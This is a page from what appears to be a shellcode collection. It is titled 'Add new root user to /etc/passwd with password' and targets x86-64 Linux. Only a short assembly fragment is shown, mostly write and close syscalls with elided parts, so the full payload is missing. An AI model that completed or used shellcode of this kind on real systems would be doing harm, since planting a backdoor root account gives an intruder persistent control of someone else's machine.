---
layout: default
title: Add new root user to /etc/passwd with password
permalink: /shellcode/asm-14.html
os: Linux
arch: Intel x86-64
length: 131
---
...
_start:
	...
	mov al, 0x01			; move write syscall num into al (rax)
	syscall				; call write

	xor rax, rax			; null rax (0)
	mov al, 0x03			; move close syscall number into al (rax)
	syscall 			; call close
...
```

```